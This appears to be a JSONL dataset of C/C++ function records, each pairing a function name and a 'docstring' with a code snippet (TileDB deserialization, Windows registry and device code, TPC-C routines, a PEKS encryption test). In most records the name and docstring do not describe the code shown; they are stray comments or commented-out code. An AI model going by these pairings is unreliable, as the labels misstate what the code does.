{"content":"{'function_name': 'query_from_capnp', 'docstring': \"\/\/ If cap'n proto object has stats set it on c++ object\", 'code': \"Status query_deserialize(\\n    const Buffer& serialized_buffer,\\n    SerializationType serialize_type,\\n    bool clientside,\\n    CopyState* copy_state,\\n    Query* query,\\n    ThreadPool* compute_tp) {\\n  \/\/ Create an original, serialized copy of the 'query' that we will revert\\n  \/\/ to if we are unable to deserialize 'serialized_buffer'.\\n  BufferList original_bufferlist;\\n  RETURN_NOT_OK(\\n      query_serialize(query, serialize_type, clientside, &original_bufferlist));\\n\\n  \/\/ The first buffer is always the serialized Query object.\\n  tiledb::sm::Buffer* original_buffer;\\n  RETURN_NOT_OK(original_bufferlist.get_buffer(\\n      0, const_cast<const tiledb::sm::Buffer**>(&original_buffer)));\\n  original_buffer->reset_offset();\\n\\n  \/\/ Similarly, we must create a copy of 'copy_state'.\\n  tdb_unique_ptr<CopyState> original_copy_state = nullptr;\\n  if (copy_state) {\\n    original_copy_state =\\n        tdb_unique_ptr<CopyState>(tdb_new(CopyState, *copy_state));\\n  }\\n\\n  \/\/ Deserialize 'serialized_buffer'.\\n  const Status st = do_query_deserialize(\\n      serialized_buffer,\\n      serialize_type,\\n      clientside ? SerializationContext::CLIENT : SerializationContext::SERVER,\\n      copy_state,\\n      query,\\n      compute_tp);\\n\\n  \/\/ If the deserialization failed, deserialize 'original_buffer'\\n  \/\/ into 'query' to ensure that 'query' is in the state it was before the\\n  \/\/ deserialization of 'serialized_buffer' failed.\\n  if (!st.ok()) {\\n    if (original_copy_state) {\\n      *copy_state = *original_copy_state;\\n    } else {\\n      copy_state = NULL;\\n    }\\n\\n    const Status st2 = do_query_deserialize(\\n        *original_buffer,\\n        serialize_type,\\n        SerializationContext::BACKUP,\\n        copy_state,\\n        query,\\n        compute_tp);\\n    if (!st2.ok()) {\\n      LOG_ERROR(st2.message());\\n      return st2;\\n    }\\n  }\\n\\n  return st;\\n}\"}","id":538}
{"content":"{'function_name': 'istrazivanje', 'docstring': '\/\/vrati index sljedece aktivnosti', 'code': 'int podskup_gotovih_i_analiziranih(int prethode, vector<int> lista_gotovih,int trenutno_vrijeme, int pripravnost){\\n\\tint j, br = 1;\\n\\t\/\/ukoliko posao jo\u0161 nije pripravan, prekini\\n\\tif(trenutno_vrijeme<pripravnost){\\n\\t\\treturn 0;\\n\\t}\\n\\n\\tfor (j=0; j<lista_gotovih.size(); j++) {\\n\\t\\tif (prethode == lista_gotovih[j]) {\\n\\t\\t\\tbr -= 1;\\n\\t\\t\\tbreak;\\n\\t\\t}\\n\\t}\\n\\t\\n\\tif (br == 0) return 1;\\n\\treturn 0;\\n}'}","id":541}
{"content":"{'function_name': 'generateSphere', 'docstring': '\/\/inicio da constru\u00e7\u00e3o', 'code': 'string polarToCart(float radius, float alpha, float beta){\\n\\tfloat x = radius*cos(beta)*sin(alpha);\\n\\tfloat y = radius*sin(beta);\\n\\tfloat z = radius*cos(beta)*cos(alpha);\\n\\treturn to_string(x) + \", \" + to_string(y) + \", \" + to_string(z) + \"\\\\n\";\\n\\t\/\/return \"glVertex3f(\" + to_string(x) + \"f, \" + to_string(y) + \"f, \" + to_string(z) + \"f);\\\\n\";\\n}'}","id":542}
{"content":"{'function_name': 'MimeOleGetFileExtension', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleGetExtClassId(LPCSTR pszExtension, LPCLSID pclsid)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT         hr=S_OK;\\r\\n    ULONG           cb;\\r\\n    LPSTR           pszCLSID=NULL;\\r\\n    HKEY            hkeyExt=NULL;\\r\\n    HKEY            hkeyCLSID=NULL;\\r\\n    LPSTR           pszData=NULL;\\r\\n    LPWSTR          pwszCLSID=NULL;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == pszExtension || NULL == pclsid)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Otherwise, lets lookup the extension in HKEY_CLASSESS_ROOT\\r\\n    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, pszExtension, 0, KEY_READ, &hkeyExt) != ERROR_SUCCESS)\\r\\n    {\\r\\n        hr = MIME_E_NOT_FOUND;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Query Value\\r\\n    if (RegQueryValueEx(hkeyExt, NULL, 0, NULL, NULL, &cb) != ERROR_SUCCESS)\\r\\n    {\\r\\n        hr = MIME_E_NOT_FOUND;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Allocate Size\\r\\n    cb += 1;\\r\\n    CHECKHR(hr = HrAlloc((LPVOID *)&pszData, cb));\\r\\n\\r\\n    \/\/ Get the data\\r\\n    if (RegQueryValueEx(hkeyExt, NULL, 0, NULL, (LPBYTE)pszData, &cb) != ERROR_SUCCESS)\\r\\n    {\\r\\n        hr = TrapError(E_FAIL);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Close this regkey\\r\\n    RegCloseKey(hkeyExt);\\r\\n    hkeyExt = NULL;\\r\\n\\r\\n    \/\/ Otherwise, lets lookup the extension in HKEY_CLASSESS_ROOT\\r\\n    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, pszData, 0, KEY_READ, &hkeyExt) != ERROR_SUCCESS)\\r\\n    {\\r\\n        hr = MIME_E_NOT_FOUND;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Otherwise, lets lookup the extension in HKEY_CLASSESS_ROOT\\r\\n    if (RegOpenKeyEx(hkeyExt, c_szCLSID, 0, KEY_READ, &hkeyCLSID) != ERROR_SUCCESS)\\r\\n    {\\r\\n        hr = MIME_E_NOT_FOUND;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Get the data\\r\\n    if (RegQueryValueEx(hkeyCLSID, NULL, 0, NULL, NULL, &cb) != ERROR_SUCCESS)\\r\\n    {\\r\\n        hr = TrapError(E_FAIL);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Add One\\r\\n    cb += 1;\\r\\n    CHECKHR(hr = HrAlloc((LPVOID *)&pszCLSID, cb));\\r\\n\\r\\n    \/\/ Get the data\\r\\n    if (RegQueryValueEx(hkeyCLSID, NULL, 0, NULL, (LPBYTE)pszCLSID, &cb) != ERROR_SUCCESS)\\r\\n    {\\r\\n        hr = TrapError(E_FAIL);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ ToUnicode\\r\\n    IF_NULLEXIT(pwszCLSID = PszToUnicode(CP_ACP, pszCLSID));\\r\\n\\r\\n    \/\/ Convert to class id\\r\\n    CHECKHR(hr = CLSIDFromString(pwszCLSID, pclsid));\\r\\n\\r\\nexit:\\r\\n    \/\/ Close Reg Keys\\r\\n    if (hkeyExt)\\r\\n        RegCloseKey(hkeyExt);\\r\\n    if (hkeyCLSID)\\r\\n        RegCloseKey(hkeyCLSID);\\r\\n    SafeMemFree(pszData);\\r\\n    SafeMemFree(pwszCLSID);\\r\\n    SafeMemFree(pszCLSID);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":545}
{"content":"{'function_name': 'main', 'docstring': '\/\/cout<<endl;', 'code': 'void Union(int id1,int id2)\\n{\\n    id1=Find(id1);id2=Find(id2);\\n    if (id1==id2) return;\\n    if (S[Root[id1]].size<S[Root[id2]].size) swap(id1,id2);\/\/\u4fdd\u8bc1id1\u6240\u5728\u7684Splay\u5927\u5c0f\u5927\u4e8eid2\u6240\u5728\u7684Splay\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u662f\u628aid2\u5408\u5e76\u5230id1\u4e2d\\n    Mayuri[id2]=id1;\\n    int h=1,t=0;Queue[1]=Root[id2];\\n    do\\n    {\\n\\tint u=Queue[++t];\\n\\tif (S[u].ch[0]) Queue[++h]=S[u].ch[0];\\n\\tif (S[u].ch[1]) Queue[++h]=S[u].ch[1];\\n\\tS[u].fa=S[u].ch[0]=S[u].ch[1]=S[u].size=0;\\n    }\\n    while (t!=h);\\n    for (int i=h;i>=1;i--)\\n    {\\n\\tint x=Queue[i];\\n\\tif ((S[x].key==inf)||(S[x].key==-inf)) continue;\\n\\tint now=Root[id1],nowf=0;\\n\\twhile (now)\\n\\t{\\n\\t    nowf=now;now=S[now].ch[S[x].key>S[now].key];\\n\\t}\\n\\tnow=x;\\n\\tS[now].fa=nowf;\\n\\tS[nowf].ch[S[x].key>S[nowf].key]=now;\\n\\tS[now].size=1;\\n\\tSplay(id1,now,0);\\n    }\\n    return;\\n}'}","id":546}
{"content":"{'function_name': 'runOrderStatus', 'docstring': '\/*\\n    int q_cid = orderstatus->c_id;\\n    int q_cwid = orderstatus->c_w_id;\\n    int q_cdid = orderstatus->c_d_id;\\n    char *q_clast = orderstatus->c_last;\\n\\n    char *record = NULL;\\n    char *match[16];\\n    int offset,last;\\n    int64_t out_c_id,key;\\n    char out_c_first[255],out_c_middle[255],out_c_last[255];\\n    double out_c_balance;\\n    if (q_cid == 0) {\\n        =============================\\n        SELECT c_id\\n        INTO out_c_id\\n        FROM customer\\n        WHERE c_w_id = in_c_w_id\\n          AND c_d_id = in_c_d_id\\n          AND c_last = in_c_last\\n          ORDER BY c_first ASC limit 1;\\n        =============================\\n        key = hash (q_clast,C_LAST_LEN);\\n\\t    key = ((0x1L<<32)-1) & key;\\n        key += ((q_cwid-1)*DISTRICT_PER_WAREHOUSE+(q_cdid-1))*CUSTOMER_PER_DISTRICT;\\n        last = ht_customer2.probe (key,match,16);\\n        if (last < 0) record = match[7];\\n        else record = match[last\/2];\\n        offset = customer.getColumnOffset(0);\\n        q_cid = *(int64_t*)(record+offset);\\n    }\\n    else {\\n        key = q_cid-1;\\n        key += ((q_cwid-1)*DISTRICT_PER_WAREHOUSE+(q_cdid-1))*CUSTOMER_PER_DISTRICT;\\n        last = ht_customer.probe (key,match,16);\\n#ifdef DEBUG\\n        if (last != 1) {\\n            printf (\"[main][ERROR][runPayment]: customer not found! -3\\\\n\");\\n            return -3;\\n        }\\n#endif\\n        record = match[0];\\n    }\\n    out_c_id = q_cid;\\n    ===============================\\n    SELECT c_first, c_middle, c_last, c_balance\\n\\tINTO out_c_first, out_c_middle, out_c_last, out_c_balance\\n\\tFROM customer\\n\\tWHERE c_w_id = in_c_w_id   \\n\\t  AND c_d_id = in_c_d_id\\n\\t  AND c_id = out_c_id;\\n    =================================\\n    strncpy (out_c_first,record+customer.getColumnOffset(3),255);\\n    strncpy (out_c_middle,record+customer.getColumnOffset(4),255);\\n    strncpy (out_c_last,record+customer.getColumnOffset(5),255);\\n    out_c_balance = *(double*)(record+customer.getColumnOffset(16));\\n    =============================== \\n\\tSELECT o_id, o_carrier_id, o_entry_d, o_ol_cnt\\n\\tINTO out_o_id, out_o_carrier_id, out_o_entry_d, out_o_ol_cnt\\n\\tFROM orders\\n\\tWHERE o_w_id = in_c_w_id\\n  \\tAND o_d_id = in_c_d_id\\n  \\tAND o_c_id = out_c_id\\n\\tORDER BY o_id DESC limit 1;\\n    =================================\\n    key = out_c_id-1;\\n    key += (q_cdid-1)*CUSTOMER_PER_DISTRICT;\\n    key += (q_cwid-1)*CUSTOMER_PER_DISTRICT*DISTRICT_PER_WAREHOUSE;\\n    last = ht_order2.probe (key, match, 4);\\n#ifdef DEBUG\\n    if (last == 0) {\\n        printf (\"[main][ERROR][runOrderStatus]: table order error! 1219\\\\n\");\\n        return -4;\\n    }\\n#endif\\n    record = match[0];\\n    int64_t out_o_id = *(int64_t*)(record+order.getColumnOffset(0));\\n    int64_t out_o_carrier_id = *(int64_t*)(record+order.getColumnOffset(5));\\n    int64_t out_o_entry_d = *(int64_t*)(record+order.getColumnOffset(4));\\n    int64_t out_o_ol_cnt = *(int64_t*)(record+order.getColumnOffset(6));\\n    ================================\\n        declare c cursor for SELECT ol_i_id, ol_supply_w_id, ol_quantity, \\n                                    ol_amount, ol_delivery_d\\n                             FROM order_line\\n                             WHERE ol_w_id = in_c_w_id\\n                               AND ol_d_id = in_c_d_id\\n                               AND ol_o_id = out_o_id;\\n    ==================================\\n    int64_t out_ol_i_id[15],out_ol_supply_w_id[15],out_ol_quantity[15],out_ol_delivery[15];\\n    double out_ol_amount[15];\\n    key = out_o_id - 1;\\n    key += (q_cdid-1)*ORDER_PER_DISTRICT;\\n    key += (q_cwid-1)*ORDER_PER_DISTRICT*DISTRICT_PER_WAREHOUSE;\\n    last = ht_orderline.probe (key, match, 16);\\n#ifdef DEBUG\\n    if (last <= 0) {\\n        printf (\"[main][ERROR][runOrderStatus]: table orderline error! 1234\\\\n\");\\n        return -4;\\n    }\\n#endif\\n    int offset1 = order_line.getColumnOffset (4);\\n    int offset2 = order_line.getColumnOffset (5);\\n    int offset3 = order_line.getColumnOffset (7);\\n    int offset4 = order_line.getColumnOffset (8);\\n    int offset5 = order_line.getColumnOffset (6);\\n    for (int ii=0;ii<last;ii++) {\\n        out_ol_i_id[ii] = *(int64_t*)(match[ii]+offset1);\\n        out_ol_supply_w_id[ii] = *(int64_t*)(match[ii]+offset2);\\n        out_ol_quantity[ii] = *(int64_t*)(match[ii]+offset3);\\n        out_ol_amount[ii] = *(double*)(match[ii]+offset4);\\n        out_ol_delivery[ii] = *(int64_t*)(match[ii]+offset5);\\n    }\\n*\/', 'code': 'int runStockLevel(struct input_stock_level_t *stocklevel, struct tpcc_context context)\\n{\\n\/*\\n    int q_w_id = stocklevel->w_id;\\n    int q_d_id = stocklevel->d_id;\\n    int64_t q_threshold = stocklevel->threshold;\\n    =============================\\n    SELECT d_next_o_id\\n    INTO tmp_d_next_o_id\\n    FROM district\\n    WHERE d_w_id = in_w_id\\n      AND d_id = in_d_id;\\n    ===============================\\n    int64_t key = q_d_id-1+(q_w_id-1)*DISTRICT_PER_WAREHOUSE,key2;\\n    char *match[16], *match2[16];\\n    int last = ht_district.probe (key, match, 16),last2;\\n#ifdef DEBUG\\n    if (last != 1) {\\n        printf (\"[main][ERROR][runStockLevel]: table district error! 1271\\\\n\");\\n        return -1;\\n    }\\n#endif\\n    char *record = match[0];\\n    int offset = district.getColumnOffset (10);\\n    int64_t tmp_next_o_id = *(int64_t*)(record+offset);\\n    =============================\\n    SELECT count(*)\\n    INTO low_stock\\n    FROM order_line, stock, district\\n    WHERE d_id = in_d_id\\n        AND d_w_id = in_w_id\\n        AND d_id = ol_d_id\\n        AND d_w_id = ol_w_id\\n        AND ol_i_id = s_i_id\\n        AND ol_w_id = s_w_id\\n        AND s_quantity < in_threshold\\n        AND ol_o_id BETWEEN (tmp_d_next_o_id - 20)\\n                        AND (tmp_d_next_o_id - 1);\\n    ===============================\\n    int offset1 = order_line.getColumnOffset(4);\\n    int offset2 = stock.getColumnOffset(2);\\n    int out_low_stock = 0;\\n    for (int64_t tmp_o_id=tmp_next_o_id-20; tmp_o_id<= tmp_next_o_id-1; tmp_o_id++) {\\n        key = tmp_o_id-1;\\n        key += (q_d_id-1)*ORDER_PER_DISTRICT;\\n        key += (q_w_id-1)*ORDER_PER_DISTRICT*DISTRICT_PER_WAREHOUSE;\\n        last2 = ht_orderline.probe (key, match, 16);\\n#ifdef DEBUG\\n        if (last2 < 0) {\\n            printf (\"[main][ERROR][runStockLevel]: table order_line error! 1288\\\\n\");\\n            return -2;\\n        }\\n#endif\\n        for (int ii=0;ii<last;ii++) {\\n            int64_t i_id = *(int64_t*)(match[ii]+offset1);\\n            key2 = i_id-1;\\n            key2 += (q_w_id-1)*MAXIMUM_ITEM_NUMBER;\\n            last2 = ht_item.probe (key2, match2, 16);\\n#ifdef DEBUG\\n            if (last2 != 1) {\\n                printf (\"[main][ERROR][runStockLevel]: table item error! 1300\\\\n\");\\n                return -3;\\n            }\\n#endif\\n            int64_t quantity = *(int64_t*)(match2[0]+offset2);\\n            if (quantity < q_threshold)\\n                out_low_stock ++;\\n        }\\n    }\\n*\/\\n    return 0;\\n}'}","id":552}
{"content":"{'function_name': 'NeuroSimNeuronLeakagePower', 'docstring': '\/\/ Same as NeuroSimNeuronReadEnergy', 'code': \"double NeuroSimNeuronTransferEnergy(SubArray *subArray, int numWriteOperationPerRow, double numWriteCellPerOperation)\\n{\\n        double energyReadLSB=0, energyWriteMSB=0;\\n        subArray->wlSwitchMatrix_LSB.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n        subArray->blSwitchMatrix_LSB.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n        subArray->mux.CalculatePower(subArray->numReadPulse);\\n        subArray->mux_2to1.CalculatePower(subArray->numReadPulse);\\n        subArray->muxDecoder.CalculatePower(subArray->numReadPulse, 1);\\t\/\/ Don't care write\\n        subArray->muxDecoder_2to1.CalculatePower(subArray->numReadPulse,1);\\n        subArray->readCircuit.CalculatePower(subArray->numReadPulse);\\n        subArray->subtractor.CalculatePower(subArray->numReadPulse, subArray->numReadCellPerOperationNeuro \/ subArray->numCellPerSynapse);\\n        if (subArray->shiftAddEnable) {\\n            subArray->shiftAdd.CalculatePower(subArray->numReadPulse);\\n        }\\n        energyReadLSB = subArray->wlSwitchMatrix_LSB.readDynamicEnergy +\\n        subArray->blSwitchMatrix_LSB.readDynamicEnergy +\\n        subArray->mux.readDynamicEnergy +\\n        subArray->numColMuxed*subArray->mux_2to1.readDynamicEnergy+\\n        subArray->muxDecoder.readDynamicEnergy +\\n        subArray->numColMuxed*subArray->muxDecoder_2to1.readDynamicEnergy+\\n        subArray->readCircuit.readDynamicEnergy +\\n        subArray->subtractor.readDynamicEnergy +\\n        subArray->shiftAdd.readDynamicEnergy; \\n        subArray->blSwitchMatrix.numWritePulse = 1;\\t\/\/ Does not matter\\n        subArray->slSwitchMatrix.numWritePulse = subArray->numWritePulse;\\n        subArray->wlSwitchMatrix.CalculatePower(1, 1);\\t\/\/ Don't care read\\n        subArray->blSwitchMatrix.CalculatePower(1, 1);\\t\/\/ Don't care read\\n        subArray->slSwitchMatrix.CalculatePower(1, numWriteOperationPerRow);\\t\/\/ Don't care read\\n        energyWriteMSB = subArray->wlSwitchMatrix.writeDynamicEnergy +\\n                                      subArray->blSwitchMatrix.writeDynamicEnergy +\\n                                      subArray->slSwitchMatrix.writeDynamicEnergy; \\n        return energyReadLSB + energyWriteMSB; \\n}\"}","id":556}
{"content":"{'function_name': 'AddDeviceByName', 'docstring': '\/*\\r\\n    USES_CONVERSION;\\r\\n\\r\\n    LIST_ENTRY * pentry;\\r\\n    LIST_ENTRY * pentryNext;\\r\\n\\r\\n    ACTIVE_DEVICE*   pActiveDevice  = NULL;\\r\\n\\r\\n    BOOL        fAlreadyExists      = FALSE;\\r\\n\\r\\n    DBG_TRC((\"Requested arrival of device (%ws) \",pszDeviceName));\\r\\n\\r\\n    \/\/ BEGIN PROTECTED CODE\\r\\n    {\\r\\n        TAKE_CRIT_SECT t(g_DeviceListSync);\\r\\n\\r\\n        for ( pentry  = g_DeviceListHead.Flink;\\r\\n              pentry != &g_DeviceListHead;\\r\\n              pentry  = pentryNext ) {\\r\\n\\r\\n            pentryNext = pentry->Flink;\\r\\n\\r\\n            pActiveDevice = CONTAINING_RECORD( pentry,ACTIVE_DEVICE ,m_ListEntry );\\r\\n\\r\\n            if ( pActiveDevice->m_dwSignature != ADEV_SIGNATURE ) {\\r\\n                ASSERT((\"Invalid device signature\", 0));\\r\\n                break;\\r\\n            }\\r\\n\\r\\n            if (!::lstrcmpi(pszDeviceName,(LPCTSTR)pActiveDevice->m_strStiDeviceName)) {\\r\\n\\r\\n                fAlreadyExists = TRUE;\\r\\n                break;\\r\\n            }\\r\\n        }\\r\\n\\r\\n        if (!fAlreadyExists) {\\r\\n\\r\\n            pActiveDevice = new ACTIVE_DEVICE(pszDeviceName);\\r\\n\\r\\n            if (!pActiveDevice || !pActiveDevice->IsValid()) {\\r\\n\\r\\n                DBG_ERR((\"Creating device  failed \"));\\r\\n                if (pActiveDevice) {\\r\\n                    delete pActiveDevice;\\r\\n                }\\r\\n\\r\\n                return FALSE;\\r\\n            }\\r\\n\\r\\n            \/\/ Finally insert new object into the list\\r\\n            InsertTailList(&g_DeviceListHead,&pActiveDevice->m_ListEntry);\\r\\n        }\\r\\n        else {\\r\\n            STIMONWPRINTF(TEXT(\"Request to add new device found device is already maintained\"));\\r\\n            return FALSE;\\r\\n        }\\r\\n    }\\r\\n    \/\/ END PROTECTED CODE\\r\\n\\r\\n    \/\/\\r\\n    \/\/ If new device appeared - initialize PnP interface notifications\\r\\n    \/\/\\r\\n    if ( pActiveDevice ) {\\r\\n\\r\\n        TAKE_ACTIVE_DEVICE t(pActiveDevice);\\r\\n\\r\\n        pActiveDevice->InitPnPNotifications(g_hStiServiceWindow);\\r\\n\\r\\n    }\\r\\n\\r\\n    \/\/\\r\\n    \/\/ If this device or it\\'s USD requests auto-generating a launch event on arrival\\r\\n    \/\/ schedule it here\\r\\n    \/\/\\r\\n    \/\/ NOTE : This will also happen for WIA devices.  Generally, this is what we want,\\r\\n    \/\/ when a new device arrives we should generate the event, since devices such as\\r\\n    \/\/ serial cameras wont generate this on their own.\\r\\n    \/\/\\r\\n\\r\\n    \/\/\\r\\n    \/\/ For STI devices we must check whether we need to generate the\\r\\n    \/\/ event.  For WIA devices, we always want to, so it\\'s not an issue.\\r\\n    \/\/\\r\\n    BOOL bStiDeviceMustThrowEvent = (pActiveDevice->QueryFlags() & STIMON_AD_FLAG_NOTIFY_RUNNING)\\r\\n                                    && pActiveDevice->IsEventOnArrivalNeeded();\\r\\n    if (fPnPInitiated &&\\r\\n        pActiveDevice) {\\r\\n\\r\\n        TAKE_ACTIVE_DEVICE t(pActiveDevice);\\r\\n\\r\\n        STINOTIFY       sNotify;\\r\\n        BOOL            fRet;\\r\\n\\r\\n        \/\/\\r\\n        \/\/ If this is a WIA device, then the event should be WIA_EVENT_DEVICE_CONNECTED.\\r\\n        \/\/ If this is an sti device, then it should be GUID_DeviceArrivedLaunch;\\r\\n        \/\/\\r\\n\\r\\n        sNotify.dwSize = sizeof STINOTIFY;\\r\\n        if (pActiveDevice->m_pWiaDeviceInformation) {\\r\\n            sNotify.guidNotificationCode = WIA_EVENT_DEVICE_CONNECTED;\\r\\n        } else {\\r\\n\\r\\n            \/\/\\r\\n            \/\/ Check whether this STI device should throw the event\\r\\n            \/\/\\r\\n\\r\\n            if (!bStiDeviceMustThrowEvent) {\\r\\n                return TRUE;\\r\\n            }\\r\\n            sNotify.guidNotificationCode = GUID_DeviceArrivedLaunch;\\r\\n        }\\r\\n\\r\\n        DBG_TRC((\"::AddDeviceByName, processing CONNECT event (STI or WIA) for %ws\", T2W((TCHAR*)pszDeviceName)));\\r\\n        fRet = pActiveDevice->ProcessEvent(&sNotify);\\r\\n\\r\\n        if (!fRet) {\\r\\n            DBG_ERR((\"Attempted to generate event on device(%ws) arrival and failed \", pszDeviceName));\\r\\n        }\\r\\n    }\\r\\n    *\/', 'code': 'BOOL\\r\\nRemoveDeviceByName(\\r\\n    LPTSTR          pszDeviceName\\r\\n    )\\r\\n{\\r\\n\\r\\n    USES_CONVERSION;\\r\\n\\r\\n\\r\\n    DBG_FN(RemoveDeviceByName);\\r\\n\\r\\n    LIST_ENTRY * pentry;\\r\\n    LIST_ENTRY * pentryNext;\\r\\n\\r\\n    ACTIVE_DEVICE*   pActiveDevice = NULL;\\r\\n\\r\\n    BOOL        fRet = FALSE;\\r\\n\\r\\n    DBG_TRC((\"Requested removal of device (%ws)\", pszDeviceName));\\r\\n\\r\\n    \/\/ BEGIN PROTECTED CODE\\r\\n    {\\r\\n        TAKE_CRIT_SECT t(g_DeviceListSync);\\r\\n\\r\\n        for ( pentry  = g_DeviceListHead.Flink;\\r\\n              pentry != &g_DeviceListHead;\\r\\n              pentry  = pentryNext ) {\\r\\n\\r\\n            pentryNext = pentry->Flink;\\r\\n\\r\\n            pActiveDevice = CONTAINING_RECORD( pentry,ACTIVE_DEVICE ,m_ListEntry );\\r\\n\\r\\n            if ( pActiveDevice->m_dwSignature != ADEV_SIGNATURE ) {\\r\\n                ASSERT((\"Invalid device signature\", 0));\\r\\n                fRet = FALSE;\\r\\n                break;\\r\\n            }\\r\\n            TCHAR       *tszDeviceID = NULL;\\r\\n\\r\\n            tszDeviceID = W2T(pActiveDevice->GetDeviceID());\\r\\n            if (tszDeviceID) {\\r\\n                if (!::lstrcmp(pszDeviceName,tszDeviceID)) {\\r\\n\\r\\n\\r\\n                   \/\/ Mark device as being removed\\r\\n                   pActiveDevice->SetFlags(pActiveDevice->QueryFlags() | STIMON_AD_FLAG_REMOVING);\\r\\n\\r\\n                   \/\/\\r\\n                   \/\/ Remove any device notification callbacks\\r\\n                   \/\/\\r\\n                   pActiveDevice->DisableDeviceNotifications();\\r\\n\\r\\n                   \/\/\\r\\n                   \/\/ Stop PnP notifications immediately. This is important to free interface handle\\r\\n                   \/\/\\r\\n                   pActiveDevice->StopPnPNotifications();\\r\\n\\r\\n                   \/\/\\r\\n                   \/\/ Remove from the list\\r\\n                   \/\/\\r\\n                   RemoveEntryList(&pActiveDevice->m_ListEntry);\\r\\n                   pActiveDevice->m_ListEntry.Flink = pActiveDevice->m_ListEntry.Blink = NULL;\\r\\n\\r\\n                   \/\/\\r\\n                   \/\/ Destroy device object if there are no references to it\\r\\n                   \/\/\\r\\n                   ULONG ulRef = pActiveDevice->Release();\\r\\n                   if (ulRef != 0) {\\r\\n\\r\\n                       \/\/\\r\\n                       \/\/ The ACTIVE_DEVICE should have been destroyed i.e. it\\'s\\r\\n                       \/\/ ref count should have been 0.  Someone is still holding\\r\\n                       \/\/ an active count on it, which may indicate a problem\\r\\n                       \/\/ since USD wont be unloaded until ACTIVE_DEVICE is\\r\\n                       \/\/ destroyed...\\r\\n                       \/\/\\r\\n                       \/\/  NOTE:  If a transfer is occuring while deleteing, then\\r\\n                       \/\/  the ACTIVE_DEVICE will not be destroyed here (since\\r\\n                       \/\/  ref count > 0), but will be destroyed when the transfer\\r\\n                       \/\/  finishes.\\r\\n                       \/\/\\r\\n\\r\\n                       DBG_TRC((\"* ACTIVE_DEVICE is removed from list but not yet destroyed!\"));\\r\\n                       \/\/Break();\\r\\n                   }\\r\\n\\r\\n                   fRet = TRUE;\\r\\n\\r\\n                   break;\\r\\n               }\\r\\n            }\\r\\n        }\\r\\n\\r\\n    }\\r\\n    \/\/ END PROTECTED CODE\\r\\n\\r\\n    return fRet;\\r\\n}'}","id":561}
{"content":"{'function_name': 'read_state_from_capnp', 'docstring': '\/\/ Subarray partitioner', 'code': \"Status dense_read_state_from_capnp(\\n    const Array* array,\\n    const capnp::ReadState::Reader& read_state_reader,\\n    Query* query,\\n    DenseReader* reader,\\n    ThreadPool* compute_tp) {\\n  auto read_state = reader->read_state();\\n\\n  read_state->overflowed_ = read_state_reader.getOverflowed();\\n  read_state->unsplittable_ = read_state_reader.getUnsplittable();\\n  read_state->initialized_ = read_state_reader.getInitialized();\\n\\n  \/\/ Subarray partitioner\\n  if (read_state_reader.hasSubarrayPartitioner()) {\\n    RETURN_NOT_OK(subarray_partitioner_from_capnp(\\n        query->stats(),\\n        reader->stats(),\\n        query->config(),\\n        array,\\n        read_state_reader.getSubarrayPartitioner(),\\n        &read_state->partitioner_,\\n        compute_tp,\\n        \/\/ If the current partition is unsplittable, this means we need to make\\n        \/\/ sure the tile_overlap for the current is computed because we won't go\\n        \/\/ to the next partition\\n        read_state->unsplittable_));\\n  }\\n\\n  return Status::Ok();\\n}\"}","id":562}
{"content":"{'function_name': 'Trapdoor', 'docstring': '\/* H1(W)^\u03b1 = hashedW1^alpha *\/', 'code': 'int Test(char *W2, int lenW2, key_pub *pub, element_t Tw, pairing_t pairing)\\n{\\n\\t\/* PEKS for W2S *\/\\n\\n\\t\/* PEKS = [A, B] i.e. A=g^r and B=H2(t) *\/\\n\\tpeks peks;\\n\\t\\n\\telement_t H1_W2;\\n\\telement_t temp;\\n\\n\\tdouble P = mpz_get_d(pairing->r);\\n\\n\\tint nlogP = log2(P);\\n\\n\\t\/* H1(W2S) *\/\\n    char *hashedW2 = (char*) malloc(sizeof(char)*SHA512_DIGEST_LENGTH*2+1);\\n\\tsha512(W2, lenW2, hashedW2);\\n\\telement_init_G1(H1_W2, pairing);\\n\\telement_from_hash(H1_W2, hashedW2, strlen(hashedW2));\\n\\n\\n\\t\/* PEKS(key_pub, W2) *\/\\n    peks.B = (char*) malloc(sizeof(char)*(nlogP));\\n\\tPEKS(&peks, pub, pairing, H1_W2, nlogP);\\n\\n\\telement_init_GT(temp, pairing);\\n\\tpairing_apply(temp, Tw, peks.A, pairing);\\n\\n\\t\/* H2(temp) *\/\\n    char *char_temp = (char*) malloc(sizeof(char)*element_length_in_bytes(temp));\\n    char *hashed_temp = (char*) malloc(sizeof(char)*SHA512_DIGEST_LENGTH*2+1);\\n\\telement_snprint(char_temp, element_length_in_bytes(temp), temp);\\n\\tsha512(char_temp, element_length_in_bytes(temp), hashed_temp);\\n    char *H2_lhs = (char*) malloc(sizeof(char)*(nlogP));\\n\\tget_n_bits(hashed_temp, H2_lhs, nlogP);\\n\\n\\n\\tint match;\\n\\tif(!memcmp(H2_lhs, peks.B, nlogP))\\n\\t\\tmatch = 1;\\n\\telse \\n\\t\\tmatch = 0;\\n\\n\\t\/* Free the memory *\/\\n\\tfree(H2_lhs); H2_lhs = NULL;\\n\\tfree(peks.B); peks.B = NULL;\\n\\tfree(char_temp); char_temp = NULL;\\n\\tfree(hashed_temp); hashed_temp = NULL;\\n\\tfree(hashedW2); hashedW2 = NULL;\\n\\n\\treturn match;\\n}'}","id":570}
